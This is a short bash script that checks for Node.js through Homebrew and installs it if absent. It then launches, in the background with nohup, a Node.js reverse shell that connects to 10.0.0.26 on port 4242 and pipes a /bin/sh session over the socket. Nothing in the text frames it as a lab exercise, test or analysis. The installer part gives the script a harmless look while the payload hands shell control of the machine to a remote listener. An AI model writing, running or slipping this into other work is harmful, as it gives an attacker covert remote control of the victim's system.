#!/bin/bash

if brew ls --versions node > /dev/null; then
    echo "Installed";
else
    echo "Installing...";
    brew install node;
fi

nohup node -e '(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.26", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();';

sleep 1;
exit;
